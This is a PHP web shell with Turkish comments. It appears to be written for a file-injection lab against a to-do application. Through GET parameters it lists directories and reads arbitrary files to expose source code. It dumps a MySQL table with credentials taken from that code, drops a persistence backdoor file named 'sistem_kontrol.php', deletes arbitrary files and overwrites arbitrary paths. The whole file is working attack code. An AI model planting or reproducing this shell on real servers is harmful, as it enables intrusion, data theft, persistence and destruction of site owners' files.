<?php
// Hataları ekrana basmayı zorunlu tutalım ki bir sorun varsa görelim
ini_set('display_errors', 1);
error_reporting(E_ALL);

echo "<h2>Web Shell Aktif - Saf PHP Keşif Arayüzü</h2>";

// DİZİN LİSTELEME (Komut çalıştırmadan, sadece PHP ile)
if (isset($_GET['list'])) {
    $hedef_dizin = $_GET['list'];
    echo "<h3>Dizin Listeleniyor: " . htmlspecialchars($hedef_dizin) . "</h3>";
    
    if (file_exists($hedef_dizin)) {
        $dosyalar = scandir($hedef_dizin);
        echo "<ul>";
        foreach ($dosyalar as $dosya) {
            echo "<li>" . $dosya . "</li>";
        }
        echo "</ul>";
    } else {
        echo "<p style='color:red;'>Hata: Belirtilen dizin bulunamadı!</p>";
    }
}

// DOSYA OKUMA (Komut çalıştırmadan, kaynak kod ifşası)
if (isset($_GET['read'])) {
    $hedef_dosya = $_GET['read'];
    echo "<h3>Dosya İçeriği: " . htmlspecialchars($hedef_dosya) . "</h3>";
    
    if (file_exists($hedef_dosya)) {
        echo "<pre style='background: #f4f4f4; padding: 10px; border: 1px solid #ddd;'>";
        // highlight_file hem kodu okur hem de renklendirerek ekrana basar
        highlight_file($hedef_dosya);
        echo "</pre>";
    } else {
        echo "<p style='color:red;'>Hata: Dosya bulunamadı veya okunamadı!</p>";
    }
}

//Sonradan ekledim
if (isset($_GET['dump_db'])) {
    // Kaynak koddan bulduğun bilgileri buraya yazıyorsun
    $host = 'localhost';
    $user = 'root'; 
    $pass = 'buldugun_sifre';
    $db   = 'todo_app';

    $conn = new mysqli($host, $user, $pass, $db);
    if ($conn->connect_error) { die("Bağlantı hatası: " . $conn->connect_error); }

    // Örnek: Kullanıcılar veya görevler tablosunu çek
    $result = $conn->query("SELECT * FROM gorevler"); 
    echo "<h3>Veritabanı İçeriği (Saf PHP ile Çekildi):</h3><pre>";
    while($row = $result->fetch_assoc()) {
        print_r($row);
    }
    echo "</pre>";
}


if (isset($_GET['backdoor'])) {
    // Ana dizine gizli bir php dosyası bırakıyoruz
    $backdoor_path = __DIR__ . "/../sistem_kontrol.php"; 
    $backdoor_code = '<?php echo "Arka kapı aktif! Yetki bende."; ?>';
    
    if (file_put_contents($backdoor_path, $backdoor_code)) {
        echo "<b style='color:green;'>Kalıcılık Sağlandı! Arka kapı şurada oluşturuldu: /file_injection/sistem_kontrol.php</b>";
    } else {
        echo "<b style='color:red;'>Yazma izni hatası!</b>";
    }
}


// DOSYA SİLME (Komut çalıştırmadan, saf PHP fonksiyonu ile)
if (isset($_GET['delete'])) {
    $silinecek_dosya = $_GET['delete'];
    echo "<h3>Dosya Silme İşlemi: " . htmlspecialchars($silinecek_dosya) . "</h3>";
    
    // Dosya var mı ve silme işlemi başarılı mı kontrol et
    if (file_exists($silinecek_dosya)) {
        if (unlink($silinecek_dosya)) {
            echo "<b style='color:green;'>Başarılı: " . htmlspecialchars($silinecek_dosya) . " dosyası sunucudan kalıcı olarak silindi!</b>";
        } else {
            echo "<b style='color:red;'>Hata: Dosya silinemedi! (Yetki yetersiz olabilir)</b>";
        }
    } else {
        echo "<p style='color:red;'>Hata: Silinmek istenen dosya bulunamadı!</p>";
    }
}


//Dosya değiştirme veya ekleme
if (isset($_GET['edit']) && isset($_GET['content'])) {
    $hedef_dosya = $_GET['edit'];
    $yeni_icerik = $_GET['content'];

    echo "<h3>Dosya Yazma Testi</h3>";
    echo "Hedef Yol: " . htmlspecialchars($hedef_dosya) . "<br>";
    echo "Tam Yol (Realpath): " . var_export(realpath($hedef_dosya), true) . "<br>";

    // Klasörün veya dosyanın yazılabilir olup olmadığını kontrol edelim
    if (!is_writable(dirname($hedef_dosya))) {
        echo "<b style='color:red;'>HATA: Hedef klasör (uploads veya üstü) yazılabilir değil! (İzin Sorunu)</b><br>";
    }

    // Dosyayı yazmayı dene ve hatayı yakala
    try {
        $sonuc = file_put_contents($hedef_dosya, $yeni_icerik);
        if ($sonuc !== false) {
            echo "<b style='color:green;'>BAŞARILI! " . $sonuc . " bayt yazıldı.</b>";
        } else {
            echo "<b style='color:red;'>HATA: file_put_contents 'false' döndürdü.</b>";
        }
    } catch (Exception $e) {
        echo "<b style='color:red;'>Yazma Hatası: " . $e->getMessage() . "</b>";
    }
    exit;
}
    
?>
